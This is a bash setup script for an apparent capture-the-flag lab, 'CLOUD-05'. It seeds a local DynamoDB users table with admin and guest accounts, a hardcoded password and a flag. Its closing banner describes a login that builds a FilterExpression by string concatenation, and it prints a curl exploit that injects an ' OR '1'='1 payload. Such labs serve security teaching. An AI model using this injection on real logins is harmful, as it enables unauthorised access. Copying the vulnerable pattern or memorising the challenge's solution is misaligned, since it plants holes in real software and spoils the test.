#!/bin/bash
set -e

# Wait for DynamoDB to be available
until curl -s http://localhost:4566/_localstack/health | grep -q '"dynamodb":"available"'; do
  sleep 2
done

FLAG="${CVE_FLAG:-flag{cloud-05-default}}"

# Create DynamoDB table
aws --endpoint-url=http://localhost:4566 dynamodb create-table \
  --table-name users \
  --attribute-definitions AttributeName=username,AttributeType=S \
  --key-schema AttributeName=username,KeyType=HASH \
  --billing-mode PAY_PER_REQUEST

# Wait for table to be active
aws --endpoint-url=http://localhost:4566 dynamodb wait table-exists --table-name users

# Insert admin user with the flag in the 'flag' attribute
aws --endpoint-url=http://localhost:4566 dynamodb put-item \
  --table-name users \
  --item "{\"username\": {\"S\": \"admin\"}, \"password\": {\"S\": \"supersecret\"}, \"flag\": {\"S\": \"$FLAG\"}, \"role\": {\"S\": \"admin\"}}"

# Insert guest user (no flag)
aws --endpoint-url=http://localhost:4566 dynamodb put-item \
  --table-name users \
  --item "{\"username\": {\"S\": \"guest\"}, \"password\": {\"S\": \"guest\"}, \"role\": {\"S\": \"guest\"}}"

echo "CLOUD-05: DynamoDB table setup complete"
echo ""
echo "=============================================="
echo "CLOUD-05: DynamoDB NoSQL Injection"
echo "=============================================="
echo ""
echo "Web app available at http://localhost:10605"
echo "Login endpoint: POST http://localhost:10605/login"
echo "  JSON body: {\"username\": \"...\", \"password\": \"...\"}"
echo ""
echo "Vulnerability: FilterExpression string concatenation"
echo "  FilterExpression: username = '{username}' AND password = '{password}'"
echo ""
echo "Exploit: Inject into password field"
echo '  curl -X POST http://localhost:10605/login \'
echo '    -H "Content-Type: application/json" \'
echo '    -d '"'"'{"username":"admin","password":"'"'"'"'"'"'"'"'"' OR '"'"'1'"'"'='"'"'1"}'"'"''
echo ""
echo "Goal: Bypass authentication and retrieve admin's flag"
echo "=============================================="
